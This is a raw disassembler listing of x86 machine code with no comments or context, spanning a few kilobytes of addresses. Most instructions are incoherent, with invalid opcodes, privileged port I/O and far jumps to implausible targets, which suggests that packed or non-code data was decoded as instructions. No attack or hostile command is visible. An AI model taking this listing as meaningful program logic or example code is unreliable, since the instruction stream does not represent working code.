  435e7f:	jmp    0xfffb:0xc36d0901
  435e86:	call   0xd641d2f6
  435e8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435e8c:	scas   al,BYTE PTR es:[edi]
  435e8d:	test   DWORD PTR [edi+0x0],ebx
  435e93:	add    BYTE PTR [esi],ah
  435e95:	mov    ds:0xfa3b6a3e,al
  435e9a:	xchg   BYTE PTR [ecx+edi*4],dl
  435e9d:	scas   al,BYTE PTR es:[edi]
  435e9e:	shr    DWORD PTR [edx+0x33],1
  435ea1:	adc    ch,BYTE PTR [esi-0x71]
  435ea4:	inc    BYTE PTR [edx+0x20]
  435ea7:	jo     0x435eeb
  435ea9:	inc    edx
  435eaa:	sub    DWORD PTR [ecx+0x3188af9d],0x6d
  435eb1:	mov    bl,0x41
  435eb3:	stc    
  435eb4:	jbe    0x435e66
  435eb6:	stc    
  435eb7:	add    ah,cl
  435eb9:	clc    
  435eba:	adc    eax,0xb9725988
  435ebf:	jmp    0x435e55
  435ec1:	(bad)  
  435ec3:	mov    WORD PTR [ecx+0x495d8872],cs
  435ec9:	jge    0x435f1a
  435ecb:	sbb    ch,bl
  435ecd:	push   edx
  435ece:	call   0x47efb0
  435ed3:	mov    eax,ecx
  435ed5:	ins    BYTE PTR es:[edi],dx
  435ed6:	add    DWORD PTR [edi-0x6c],0x4233d4b3
  435edd:	pop    ebp
  435ede:	push   es
  435edf:	mov    esp,DWORD PTR [ebx]
  435ee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435ee2:	jle    0x435ea4
  435ee4:	and    BYTE PTR [ecx],cl
  435ee6:	mov    edi,0x45c40
  435eeb:	add    BYTE PTR [ecx+ecx*8-0x1],cl
  435eef:	add    al,0x5c
  435ef1:	add    al,0x0
  435ef3:	not    DWORD PTR [ebx]
  435ef5:	adc    al,0x0
  435ef7:	add    al,0x0
  435ef9:	add    BYTE PTR [eax],al
  435efb:	add    BYTE PTR [eax],al
  435efd:	dec    esp
  435efe:	add    al,0x7
  435f00:	test   BYTE PTR [ebx-0x68fffffa],ah
  435f06:	inc    edi
  435f07:	inc    eax
  435f08:	mov    ecx,DWORD PTR [ecx]
  435f0a:	jo     0x435e8d
  435f0c:	inc    ebp
  435f0d:	inc    eax
  435f0e:	lods   eax,DWORD PTR ds:[esi]
  435f0f:	mov    edx,0xb97d1176
  435f14:	mov    DWORD PTR [ecx+0x6a],ebx
  435f17:	jge    0x435ed9
  435f19:	sub    ecx,DWORD PTR [eax+0x40c006b]
  435f1f:	or     DWORD PTR [edi+0x6c],0x79
  435f23:	shl    DWORD PTR [edx+ebp*8+0x7c],0x41
  435f28:	adc    BYTE PTR [ebp+0x52],dl
  435f2b:	aam    0x85
  435f2d:	and    eax,0xa38b33f8
  435f32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435f33:	test   BYTE PTR [edx+0x75],cl
  435f36:	lods   eax,DWORD PTR ds:[esi]
  435f37:	out    0x48,al
  435f39:	xor    eax,0xec184f24
  435f3e:	mul    BYTE PTR [edi-0x383b4d03]
  435f44:	jb     0x435fbe
  435f46:	les    ebx,FWORD PTR [eax-0x1c]
  435f49:	(bad)  
  435f4a:	pop    ebx
  435f4b:	xchg   BYTE PTR [ebx-0x63],dl
  435f4e:	imul   eax,DWORD PTR [esi+0x489cc143],0xa56927e4
  435f58:	mov    dh,0x5b
  435f5a:	cdq    
  435f5b:	std    
  435f5c:	test   BYTE PTR [eax],bh
  435f5e:	in     eax,dx
  435f5f:	test   DWORD PTR [ebx+0x0],edx
  435f62:	add    BYTE PTR [eax],al
  435f64:	add    BYTE PTR [eax],al
  435f66:	jge    0x435f84
  435f68:	ror    DWORD PTR [edx+ebp*2],0x60
  435f6c:	or     eax,0xfd997700
  435f71:	jae    0x435ff2
  435f73:	xor    al,0x58
  435f75:	hlt    
  435f76:	out    dx,al
  435f77:	gs mov ch,0x85
  435f7a:	ret    0x4fb1
  435f7d:	push   eax
  435f7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435f7f:	add    edx,esi
  435f81:	adc    esi,DWORD PTR [ebp-0x67]
  435f84:	xchg   BYTE PTR [ebx+0x3d],dl
  435f87:	xor    al,BYTE PTR [edx+0x18]
  435f8a:	(bad)  
  435f8b:	pop    ebp
  435f8c:	mov    cl,0x27
  435f8e:	mov    al,0x9d
  435f90:	dec    edi
  435f92:	dec    esp
  435f93:	loopne 0x435fd8
  435f95:	xchg   eax,eax
  435f97:	mov    eax,ds:0x99b5797f
  435f9c:	or     al,0x83
  435f9e:	mov    eax,ds:0x3afffdcf
  435fa3:	loopne 0x435fe8
  435fa5:	add    BYTE PTR [ebp-0x67],dh
  435fa8:	std    
  435fa9:	sar    BYTE PTR [edx-0x61],0xfd
  435fad:	push   DWORD PTR [ebp+0x78]
  435fb0:	inc    ebx
  435fb1:	adc    BYTE PTR [ebp+0x2],dh
  435fb4:	out    dx,eax
  435fb5:	add    esi,DWORD PTR [ebp-0x1]
  435fb8:	bound  eax,QWORD PTR [ebp-0x7f18fd8b]
  435fbe:	dec    esi
  435fbf:	scas   al,BYTE PTR es:[edi]
  435fc0:	out    0xc,eax
  435fc2:	stc    
  435fc3:	icebp  
  435fc4:	lock add esi,DWORD PTR [ebp-0xd]
  435fc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435fc9:	pop    DWORD PTR [eax]
  435fcb:	add    BYTE PTR [eax],al
  435fcd:	add    BYTE PTR [eax],al
  435fcf:	cmp    al,BYTE PTR [edx]
  435fd1:	loop   0x436048
  435fd3:	jns    0x435fe7
  435fd5:	daa    
  435fd6:	mov    esi,DWORD PTR [esi]
  435fd8:	mov    dh,0x6e
  435fda:	inc    ebp
  435fdb:	push   ebp
  435fdc:	jns    0x435f8a
  435fde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435fdf:	test   cl,0xdb
  435fe2:	loop   0x435fd5
  435fe4:	cmp    ebx,ebp
  435fe6:	mov    ch,BYTE PTR [esi]
  435fe8:	(bad)  
  435fe9:	ins    BYTE PTR es:[edi],dx
  435fea:	retf   
  435feb:	add    DWORD PTR [edi],edx
  435fed:	outs   dx,BYTE PTR ds:[esi]
  435fee:	dec    ebp
  435fef:	mov    ch,0xe9
  435ff1:	sahf   
  435ff2:	jecxz  0x435fcd
  435ff4:	std    
  435ff5:	pop    ebp
  435ff6:	push   edi
  435ff7:	dec    ecx
  435ff8:	jns    0x435fa6
  435ffa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435ffb:	in     eax,dx
  435ffc:	push   es
  435ffd:	in     eax,dx
  435ffe:	mov    esp,0x575e42b4
  436003:	dec    ebp
  436004:	or     BYTE PTR [edi+eiz*4-0x7710c98b],0xb6
  43600c:	mov    dh,0xbe
  43600e:	inc    esi
  43600f:	xor    DWORD PTR [ecx],esi
  436011:	xor    dh,BYTE PTR [ebp+0x1e712b4]
  436017:	jne    0x43601b
  436019:	pop    ebx
  43601a:	adc    eax,0x88d33ff0
  43601f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436020:	stos   BYTE PTR es:[edi],al
  436021:	pop    esi
  436022:	inc    esp
  436023:	ins    DWORD PTR es:[edi],dx
  436024:	push   ebx
  436025:	xor    eax,0xd6980d54
  43602a:	add    esi,DWORD PTR [ebp+0x79]
  43602d:	adc    al,0xbc
  43602f:	cli    
  436030:	inc    ebp
  436031:	add    cl,dl
  436033:	add    BYTE PTR [eax],al
  436035:	add    BYTE PTR [eax],al
  436037:	add    ch,bh
  436039:	inc    ecx
  43603a:	hlt    
  43603b:	add    BYTE PTR [edx],bh
  43603d:	scas   al,BYTE PTR es:[edi]
  43603e:	std    
  43603f:	mov    eax,0xe9e429f5
  436044:	call   DWORD PTR [ecx-0x8]
  436047:	out    0xf3,al
  436049:	jno    0x436056
  43604b:	jmp    0x724e07c6
  436050:	xor    edx,esp
  436052:	sub    BYTE PTR [ecx+0x29c1036a],0x55
  436059:	add    al,BYTE PTR [eax]
  43605b:	jmp    0xa98523d6
  436060:	jbe    0x436064
  436062:	add    cl,ch
  436064:	mov    ecx,0x76e90103
  436069:	add    dh,cl
  43606b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43606c:	data16 add dl,BYTE PTR [eax]
  43606f:	jmp    0x71c75bea
  436074:	jbe    0x436078
  436076:	add    BYTE PTR [edx-0x55],ch
  436079:	scas   al,BYTE PTR es:[edi]
  43607a:	add    dh,bl
  43607c:	cli    
  43607d:	sub    al,0xb
  43607f:	jmp    0x6d033ffa
  436084:	call   0xffe:0xc0e5ffe6
  43608b:	test   eax,0x72f440ef
  436090:	mov    cl,0xe2
  436092:	xchg   BYTE PTR [edx+ebx*8+0x177dc080],ch
  436099:	xchg   BYTE PTR [eax-0x3b],cl
  43609c:	add    BYTE PTR [eax],al
  43609e:	add    BYTE PTR [eax],al
  4360a0:	add    bh,ch
  4360a2:	cmp    ah,dl
  4360a4:	ins    BYTE PTR es:[edi],dx
  4360a5:	sub    BYTE PTR [esi],dh
  4360a7:	adc    DWORD PTR [edx-0x42],esi
  4360aa:	inc    edx
  4360ab:	xor    eax,0x91e1921
  4360b0:	bound  esp,QWORD PTR [esi+edx*8+0x62490086]
  4360b7:	mov    BYTE PTR [esi+eiz*8],al
  4360ba:	addr16 aas 
  4360bc:	inc    eax
  4360bd:	push   edi
  4360be:	push   ebx
  4360bf:	clc    
  4360c0:	adc    DWORD PTR [ecx-0x1b8bff9e],0x7b
  4360c7:	cmp    eax,0xfc41d7f4
  4360cc:	jb     0x4360f1
  4360ce:	jno    0x43610f
  4360d0:	adc    ah,cl
  4360d2:	push   es
  4360d3:	add    BYTE PTR [eax],al
  4360d5:	mov    eax,0x284d830f
  4360da:	jge    0x436129
  4360dc:	clc    
  4360dd:	pop    ss
  4360de:	inc    ecx
  4360df:	sbb    BYTE PTR [ecx+0x7e],dl
  4360e2:	push   esi
  4360e3:	call   0x43ffcd
  4360e8:	mov    ecx,ecx
  4360ea:	push   0x7b844781
  4360ef:	cmp    eax,0xfc4375f4
  4360f4:	add    ebx,DWORD PTR [ebp+eax*4+0x75]
  4360f8:	in     al,0x5c
  4360fa:	jg     0x436149
  4360fc:	clc    
  4360fd:	push   ebx
  4360fe:	cmp    ebp,0xc
  436101:	dec    esp
  436102:	add    bl,ah
  436104:	push   cs
  436105:	add    BYTE PTR [eax],al
  436107:	add    BYTE PTR [eax],al
  436109:	add    bh,ah
  43610b:	aas    
  43610c:	and    BYTE PTR [ebp-0x39010d64],al
  436112:	sbb    al,0xcc
  436114:	stc    
  436115:	dec    DWORD PTR [eax+eax*1-0x41]
  436119:	pop    es
  43611a:	inc    esp
  43611b:	add    BYTE PTR [eax],al
  43611d:	add    BYTE PTR [ebx],ch
  43611f:	inc    ecx
  436120:	adc    BYTE PTR [eax],al
  436122:	push   ds
  436123:	add    BYTE PTR [eax],al
  436125:	je     0x4360f8
  436127:	test   dh,dh
  436129:	adc    BYTE PTR [edi+0x1c9b869e],bh
  43612f:	add    BYTE PTR [eax],al
  436131:	add    BYTE PTR [ebp+0x18],dh
  436134:	cmp    ah,bh
  436136:	jne    0x436104
  436138:	jns    0x436109
  43613a:	imul   ebx,DWORD PTR [ecx-0x67d4f703],0x20e94bb6
  436144:	(bad)  
  436145:	int    0xd5
  436147:	xlat   BYTE PTR ds:[ebx]
  436148:	add    dl,0x6d
  43614b:	xor    dl,BYTE PTR [eax-0x8]
  43614e:	jbe    0x436111
  436150:	cmp    dl,0x65
  436153:	pop    es
  436154:	(bad)  
  436155:	or     DWORD PTR [edx],ecx
  436157:	or     eax,0xb49c351c
  43615c:	xor    ch,0xae
  43615f:	sub    al,0xb6
  436161:	sub    eax,0x85af68ce
  436166:	cmp    bh,BYTE PTR [ecx-0x54de3f80]
  43616c:	mov    cl,BYTE PTR [ecx+0x0]
  43616f:	add    BYTE PTR [eax],al
  436171:	add    BYTE PTR [eax],al
  436173:	fidivr DWORD PTR gs:[ebx+0x43af607]
  43617a:	xchg   DWORD PTR ds:0x55518aad,ebp
  436180:	fadd   QWORD PTR [edx+0x30]
  436183:	je     0x43611e
  436185:	std    
  436186:	(bad)  
  436187:	fistp  WORD PTR [ecx-0x6630ffd5]
  43618d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43618e:	inc    edx
  43618f:	xchg   DWORD PTR [ecx-0x4e3f7b03],ebx
  436195:	mov    dl,BYTE PTR [ebx+0x4d]
  436198:	and    bh,BYTE PTR [esi]
  43619a:	sbb    ah,ch
  43619c:	pop    ecx
  43619d:	in     eax,dx
  43619e:	shl    BYTE PTR [edx-0x50],0xfd
  4361a2:	push   DWORD PTR [ebp+0x12]
  4361a5:	add    DWORD PTR [esi*2+0x55fa8299],ecx
  4361ac:	sub    bl,ah
  4361ae:	jl     0x436148
  4361b0:	add    ah,bl
  4361b2:	add    al,0x7c
  4361b4:	xchg   BYTE PTR [esi],bh
  4361b6:	or     BYTE PTR [ebp+0x2],dh
  4361b9:	loop   0x43622c
  4361bb:	add    ebp,DWORD PTR [esp+ebx*1-0x69440f48]
  4361c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4361c3:	mov    bl,0x7f
  4361c5:	mov    eax,ds:0xaf54f20c
  4361ca:	add    eax,0xe4a97ebd
  4361cf:	dec    eax
  4361d0:	int3   
  4361d1:	outs   dx,BYTE PTR ds:[esi]
  4361d2:	int    0xf8
  4361d4:	mov    esi,0xa4a8
  4361d9:	add    BYTE PTR [eax],al
  4361db:	add    BYTE PTR [ebp-0x7f],ah
  4361de:	mov    BYTE PTR [esp+edi*4],al
  4361e1:	add    edi,esp
  4361e3:	add    al,0xad
  4361e5:	jbe    0x43618d
  4361e7:	ret    
  4361e8:	popf   
  4361e9:	stc    
  4361ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4361eb:	mov    ds:0xb8e6e57d,eax
  4361f0:	jne    0x4361f4
  4361f2:	out    0xc2,al
  4361f4:	lock cmp al,0xef
  4361f7:	ret    0x998
  4361fa:	out    0xc4,al
  4361fc:	repnz inc edx
  4361fe:	out    dx,eax
  4361ff:	mov    al,BYTE PTR [edx-0xe]
  436202:	adc    eax,0x2ab448dd
  436207:	add    DWORD PTR [ebx+0x2],edi
  43620a:	out    0x3,eax
  43620c:	call   0x6c47453a
  436211:	jle    0x43627c
  436213:	or     eax,0x38d0275
  436218:	fild   DWORD PTR [edx]
  43621a:	lea    eax,[ebx]
  43621c:	pop    ebp
  43621d:	pop    eax
  43621e:	rol    BYTE PTR [ebx],0x75
  436221:	jge    0x4361d7
  436223:	or     esi,edx
  436225:	inc    ecx
  436226:	fisttp WORD PTR [edx+0x4f6df273]
  43622c:	sub    eax,0x71ee00c2
  436231:	add    al,BYTE PTR [eax]
  436233:	jmp    0xec4f9029
  436238:	jge    0x4362b8
  43623a:	fdivr  st(2),st
  43623c:	jbe    0x436240
  43623e:	jge    0x436294
  436240:	add    BYTE PTR [eax],al
  436242:	add    BYTE PTR [eax],al
  436244:	add    BYTE PTR [ebp+0x4],ch
  436247:	or     DWORD PTR [ebp+0x20],esp
  43624a:	add    BYTE PTR [eax],al
  43624c:	jmp    0xe9478e4a
  436251:	call   0x1c9:0xf9a7850e
  436258:	call   0x1075:0xaeeee009
  43625f:	add    cl,ch
  436261:	jbe    0x436204
  436263:	push   esi
  436264:	loop   0x4362dc
  436266:	add    bh,BYTE PTR [ebp-0x71]
  436269:	jno    0x436282
  43626b:	es xchg edx,eax
  43626d:	je     0x4362ec
  43626f:	xchg   ebp,eax
  436270:	jmp    0x6a4364eb
  436275:	imul   esp,DWORD PTR [esi-0x76e52200],0x5
  43627c:	jmp    0xebf55df7
  436281:	int    0x3d
  436283:	cld    
  436284:	bound  ebp,QWORD PTR [edi+esi*4-0x3b0e5420]
  43628b:	or     BYTE PTR [eax-0x3d],dh
  43628e:	stos   BYTE PTR es:[edi],al
  43628f:	std    
  436290:	and    cl,dh
  436292:	stos   DWORD PTR es:[edi],eax
  436293:	std    
  436294:	mov    edx,0x18c57f3c
  436299:	or     DWORD PTR [edi-0x43],edi
  43629c:	push   0x17
  43629e:	test   eax,0x8171097e
  4362a3:	dec    ecx
  4362a4:	in     eax,dx
  4362a5:	stc    
  4362a6:	test   eax,0x95fd
  4362ab:	add    BYTE PTR [eax],al
  4362ad:	add    BYTE PTR [ebp-0x5effdb55],ah
  4362b3:	popf   
  4362b4:	xor    al,0x43
  4362b6:	sbb    al,0xc4
  4362b8:	jecxz  0x4362bc
  4362ba:	push   ebx
  4362bb:	add    al,BYTE PTR ds:0x7b050c00
  4362c1:	out    dx,al
  4362c2:	pop    ds
  4362c3:	push   esi
  4362c4:	test   DWORD PTR [edx],0xc783051c
  4362ca:	xor    al,0x7d
  4362cc:	out    dx,eax
  4362cd:	jmp    FWORD PTR [ebx]
  4362cf:	test   DWORD PTR [ebp+0xc],esi
  4362d2:	loop   0x43633b
  4362d4:	call   DWORD PTR [edx]
  4362d6:	fadd   QWORD PTR [eax+eax*1]
  4362d9:	jne    0x436353
  4362db:	mov    edi,0x604f02e3
  4362e0:	sti    
  4362e1:	call   0x435ec1
  4362e6:	sbb    eax,0xd3c6fa5d
  4362eb:	adc    al,0x0
  4362ed:	add    ah,cl
  4362ef:	and    esi,0x3
  4362f2:	add    eax,0x9c0002ce
  4362f7:	jnp    0x436336
  4362f9:	or     bl,dl
  4362fb:	cmp    eax,0x449fa018
  436300:	add    bh,al
  436302:	mov    ds:0x9c000009,eax
  436307:	mov    ebp,0x600f02e3
  43630c:	sti    
  43630d:	call   0x435ef3
  436312:	add    BYTE PTR [eax],al
  436314:	add    BYTE PTR [eax],al
  436316:	add    bh,ah
  436318:	sar    BYTE PTR [ebx-0x1f],0x53
  43631c:	popf   
  43631d:	jmp    0x1f20:0xf683b7d3
  436324:	mov    ds:0xfe987d7c,al
  436329:	push   es
  43632a:	test   BYTE PTR [edi+0x75fffffc],dl
  436330:	mov    al,ds:0x873bfe6b
  436335:	mov    cl,0x85
  436337:	inc    ebx
  436338:	or     eax,0xdff63ea4
  43633d:	or     eax,DWORD PTR [edi-0x28014e38]
  436343:	not    BYTE PTR [edi+0x35336ddd]
  436349:	mov    BYTE PTR [ebp+0x23d4d136],0x2
  436350:	sar    ebp,1
  436352:	push   DWORD PTR [ebx+eax*8]
  436355:	or     eax,0x80b0b435
  43635a:	adc    eax,0x2db268ef
  43635f:	mov    esi,0x587dabac
  436364:	(bad)  
  436367:	cmp    bl,cl
  436369:	mov    eax,0xfd997b01
  43636e:	push   DWORD PTR [edx+0x15]
  436371:	imul   eax,DWORD PTR [esi],0x75
  436374:	cdq    
  436375:	mov    edx,0xfd998201
  43637a:	inc    DWORD PTR [eax]
  43637c:	add    BYTE PTR [eax],al
  43637e:	add    BYTE PTR [eax],al
  436380:	(bad)  
  436381:	loopne 0x4363c6
  436383:	xchg   DWORD PTR [eax],edi
  436385:	and    eax,0x1d6ac080
  43638a:	adc    eax,0x86997502
  43638f:	dec    ebx
  436390:	mov    esp,esp
  436392:	ret    0x7872
  436395:	and    al,0xc4
  436397:	xchg   DWORD PTR [eax],ebp
  436399:	dec    ebp
  43639a:	xchg   BYTE PTR [ebx+0x65],cl
  43639d:	add    al,0xc3
  43639f:	jb     0x436411
  4363a1:	xor    al,0xc4
  4363a3:	xchg   DWORD PTR [eax+0x6ac07fe5],edi
  4363a9:	sbb    eax,0x275067f
  4363ae:	out    0x8a,eax
  4363b0:	mov    esi,0x3d506eae
  4363b5:	jnp    0x436363
  4363b7:	stos   DWORD PTR es:[edi],eax
  4363b8:	stos   BYTE PTR es:[edi],al
  4363b9:	push   esp
  4363ba:	mov    bh,0xab
  4363bc:	pop    es
  4363bd:	fsubr  st(6),st
  4363bf:	add    esi,eax
  4363c1:	cmp    al,0xf3
  4363c3:	add    esi,DWORD PTR [esi+0x1940c0aa]
  4363c9:	fldenv [ebx-0x30c1ed4d]
  4363cf:	mov    DWORD PTR [esi+0x71c066aa],esp
  4363d5:	fldcw  WORD PTR [ecx]
  4363d7:	inc    esp
  4363d8:	adc    dh,BYTE PTR [eax-0x7c8afc20]
  4363de:	rol    DWORD PTR [esi],0x58
  4363e1:	loopne 0x43644e
  4363e3:	and    BYTE PTR [eax],al
  4363e5:	add    BYTE PTR [eax],al
  4363e7:	add    BYTE PTR [eax],al
  4363e9:	cdq    
  4363ea:	add    ah,BYTE PTR [esi+0x37]
  4363ed:	fld    DWORD PTR [ecx]
  4363ef:	fidivr DWORD PTR [edi-0x6e]
  4363f2:	cld    
  4363f3:	out    0x3,al
  4363f5:	jl     0x436467
  4363f7:	in     eax,0xb4
  4363f9:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4363fb:	pop    esi
  4363fc:	(bad)  
  4363fd:	test   al,0xa1
  4363ff:	and    eax,0x6ff9b781
  436404:	dec    edi
  436405:	lods   eax,DWORD PTR ds:[esi]
  436406:	add    bl,BYTE PTR [edi-0xb08607f]
  43640c:	aad    0xf0
  43640e:	mov    edx,0xc16ca366
  436413:	dec    esi
  436414:	dec    DWORD PTR [ebx]
  436416:	shr    eax,0x2
  436419:	jne    0x43641d
  43641b:	pop    esi
  43641c:	shl    edx,0x36
  43641f:	mov    edx,0xc96e0058
  436425:	call   0x42c43ecc
  43642a:	idiv   bh
  43642c:	test   al,0xf5
  43642e:	gs add al,0x28
  436431:	sbb    al,0xff
  436433:	jl     0x43644c
  436435:	jae    0x43645c
  436437:	jns    0x4363c2
  436439:	push   0xefe9f9a5
  43643e:	inc    ebx
  43643f:	fs pusha 
  436441:	mov    eax,0x2d6e0946
  436446:	lods   eax,DWORD PTR ds:[esi]
  436447:	stc    
  436448:	(bad)  
  436449:	cmc    
  43644a:	stos   BYTE PTR es:[edi],al
  43644b:	sbb    ah,dh
  43644d:	add    BYTE PTR [eax],al
  43644f:	add    BYTE PTR [eax],al
  436451:	add    BYTE PTR [ecx-0x36110929],bl
  436457:	ret    
  436458:	inc    ecx
  436459:	push   ecx
  43645a:	jno    0x43645e
  43645c:	add    cl,ch
  43645e:	rol    DWORD PTR [ebx],0xf
  436461:	jmp    0x1ec866dc
  436466:	mov    eax,ds:0xa42548ef
  43646b:	xor    al,0xe5
  43646d:	jmp    0xa820:0x6a003dfb
  436474:	outs   dx,BYTE PTR ds:[esi]
  436475:	or     esi,esp
  436477:	sub    esp,edi
  436479:	jmp    0xf0ffe2ef
  43647e:	jbe    0x436482
  436480:	or     DWORD PTR [edi+0x74],ebx
  436483:	stos   DWORD PTR es:[edi],eax
  436484:	dec    ebx
  436485:	(bad)  
  436486:	std    
  436487:	mov    eax,0x273489cd
  43648c:	ret    0xeff1
  43648f:	push   ecx
  436490:	clc    
  436491:	jmp    0xc844:0xeafa27be
  436498:	test   DWORD PTR [esi-0x1a4f04a2],ebp
  43649e:	inc    ebx
  43649f:	xor    bl,BYTE PTR [esi]
  4364a1:	test   eax,0x6ac57f76
  4364a6:	pop    ss
  4364a7:	add    esp,DWORD PTR [edx+0x0]
  4364aa:	in     eax,0x3d
  4364ac:	aas    
  4364ad:	jo     0x436452
  4364af:	out    0x67,al
  4364b1:	mov    edx,DWORD PTR [ebx]
  4364b3:	fnstcw WORD PTR [eax+0xeb]
  4364b9:	add    BYTE PTR [eax],al
  4364bb:	pop    edi
  4364bc:	and    dh,0x3
  4364bf:	push   edi
  4364c0:	ds pop esp
  4364c2:	jb     0x436463
  4364c4:	sub    DWORD PTR [ebx],ecx
  4364c6:	add    BYTE PTR [ecx+eax*1+0x31],cl
  4364ca:	inc    edi
  4364cb:	hlt    
  4364cc:	icebp  
  4364cd:	sbb    ch,bl
  4364cf:	sbb    edi,DWORD PTR [esp+eiz*4+0x24]
  4364d3:	or     al,0x1
  4364d5:	add    BYTE PTR [eax],al
  4364d7:	xchg   edi,eax
  4364d8:	ss push 0x4cfd4b0f
  4364de:	jo     0x43655e
  4364e0:	add    BYTE PTR ds:[ebx],dh
  4364e3:	mov    esi,0x535480d7
  4364e8:	out    dx,al
  4364e9:	test   BYTE PTR [edi+0x34],0x97
  4364ed:	inc    eax
  4364ee:	push   0x878558ae
  4364f3:	fdiv   st(1),st
  4364f5:	(bad)  
  4364f6:	call   DWORD PTR [ecx+0x41]
  4364f9:	ins    BYTE PTR es:[edi],dx
  4364fa:	mov    ebp,ebx
  4364fc:	and    eax,0x89414c3f
  436501:	lock add cl,ah
  436504:	add    BYTE PTR [edx-0x73],cl
  436507:	mov    ecx,DWORD PTR [edx+0x50]
  43650a:	push   ecx
  43650b:	(bad)  
  43650d:	(bad)  
  43650e:	call   FWORD PTR [eax+eax*1+0x39111362]
  436515:	jo     0x436567
  436517:	jbe    0x436517
  436519:	out    0x59,eax
  43651b:	into   
  43651c:	add    BYTE PTR [eax],al
  43651e:	mov    eax,DWORD PTR [eax]
  436520:	add    BYTE PTR [eax],al
  436522:	add    BYTE PTR [eax],al
  436524:	leave  
  436525:	pop    eax
  436526:	jnp    0x4364ec
  436528:	je     0x436551
  43652a:	cmp    eax,0xc41675d8
  43652f:	or     eax,edi
  436531:	jle    0x43652f
  436533:	jmp    FWORD PTR [edx+0x33]
  436536:	inc    ebp
  436537:	push   0x139d3a
  43653c:	jne    0x4364d7
  43653e:	jp     0x436581
  436540:	fstp   DWORD PTR [eax+0x548c6046]
  436546:	adc    eax,0x2f8f609
  43654b:	add    BYTE PTR [ebp+0x20],dh
  43654e:	cmp    eax,0xfd9aed54
  436553:	push   DWORD PTR [ebp+0x8]
  436556:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436557:	test   DWORD PTR [edx+0x361d3555],esi
  43655d:	and    DWORD PTR [eax],eax
  43655f:	jg     0x43655f
  436561:	fcmovb st,st(2)
  436563:	call   0xc0bb11e5
  436568:	in     al,dx
  436569:	(bad)  
  43656a:	mov    bh,0x35
  43656c:	xor    eax,DWORD PTR [ebp+ebp*8+0x7c]
  436570:	jo     0x436527
  436572:	std    
  436573:	or     cl,dh
  436575:	ins    BYTE PTR es:[edi],dx
  436576:	cmc    
  436577:	jmp    edx
  436579:	xchg   esp,eax
  43657a:	ja     0x43657a
  43657c:	fcmovnu st,st(6)
  43657e:	scas   eax,DWORD PTR es:[edi]
  43657f:	test   ebx,eax
  436581:	mov    BYTE PTR [ebp+0x41e53a85],bl
  436587:	jge    0x436589
  436589:	add    BYTE PTR [eax],al
  43658b:	add    BYTE PTR [eax],al
  43658d:	mov    ebx,0xfdd802b1
  436592:	call   0x859d:0x6875fffd
  436599:	cmp    ch,ch
  43659b:	jp     0x4365f0
  43659d:	popf   
  43659e:	icebp  
  43659f:	loopne 0x43655d
  4365a1:	out    dx,al
  4365a2:	popf   
  4365a3:	test   BYTE PTR [ebp+0x8955ab4],al
  4365a9:	jp     0x4365ad
  4365ab:	cdq    
  4365ac:	ret    
  4365ad:	cli    
  4365ae:	xor    eax,0x2bb4ee53
  4365b3:	sub    BYTE PTR [esi+0x32],bh
  4365b6:	sar    DWORD PTR [edi],0x13
  4365b9:	repnz cmp al,0x1b
  4365bc:	sub    eax,esp
  4365be:	stos   BYTE PTR es:[edi],al
  4365bf:	xlat   BYTE PTR ds:[ebx]
  4365c0:	ss add ecx,0x40
  4365c4:	sti    
  4365c5:	jge    0x436633
  4365c7:	and    dh,dl
  4365c9:	push   eax
  4365ca:	xlat   BYTE PTR ds:[ebx]
  4365cb:	pop    ss
  4365cc:	jle    0x43657a
  4365ce:	sbb    al,BYTE PTR [ecx-0x68cc4e84]
  4365d4:	mov    dl,0xb4
  4365d6:	sbb    al,BYTE PTR [eax]
  4365d8:	sub    ah,BYTE PTR ds:[ebx+0x778c38e7]
  4365df:	sub    ah,al
  4365e1:	or     eax,0x3579e1fa
  4365e6:	jg     0x43660f
  4365e8:	add    eax,0xf456b240
  4365ed:	out    dx,eax
  4365ee:	xchg   bh,ah
  4365f0:	add    eax,DWORD PTR [eax]
  4365f2:	add    BYTE PTR [eax],al
  4365f4:	add    BYTE PTR [eax],al
  4365f6:	jne    0x4365fa
  4365f8:	data16 das 
  4365fa:	icebp  
  4365fb:	add    edx,ebx
  4365fd:	xchg   DWORD PTR [edx],edi
  4365ff:	cli    
  436600:	out    0x3,al
  436602:	ins    BYTE PTR es:[edi],dx
  436603:	ins    BYTE PTR es:[edi],dx
  436604:	in     eax,0xb0
  436606:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  436608:	pop    esi
  436609:	ret    0xa1c0
  43660c:	pop    esi
  43660d:	aas    
  43660e:	sar    DWORD PTR [edi],0x66
  436611:	retf   0xff6d
  436614:	mov    esi,0x66bd0701
  436619:	les    esi,FWORD PTR [ebx+0x60ac3479]
  43661f:	mov    dl,0xf5
  436621:	fprem  
  436623:	cmp    cl,BYTE PTR [edi]
  436625:	add    edi,esp
  436627:	mov    ah,0x0
  436629:	call   0xf8b1:0x64eedcf0
  436630:	sbb    DWORD PTR [eax-0x11fffd94],0xfffffffd
  436637:	xor    eax,0x5ff1c741
  43663c:	jge    0x436687
  43663e:	jo     0x43665f
  436640:	shr    dl,0x37
  436643:	test   al,0xfe
  436645:	outs   dx,DWORD PTR ds:[esi]
  436646:	call   0xea20:0xaac87a6
  43664d:	jmp    0x43663e
  43664f:	gs add cl,ch
  436652:	jbe    0x436678
  436654:	jge    0x4365f2
  436656:	cld    
  436657:	adc    DWORD PTR [ecx],ecx
  436659:	pop    edi
  43665a:	add    BYTE PTR [eax],al
  43665c:	add    BYTE PTR [eax],al
  43665e:	add    dl,dh
  436660:	mov    DWORD PTR [ebx+0x2d],ecx
  436663:	bound  eax,QWORD PTR [ebx-0x75]
  436666:	test   al,0x79
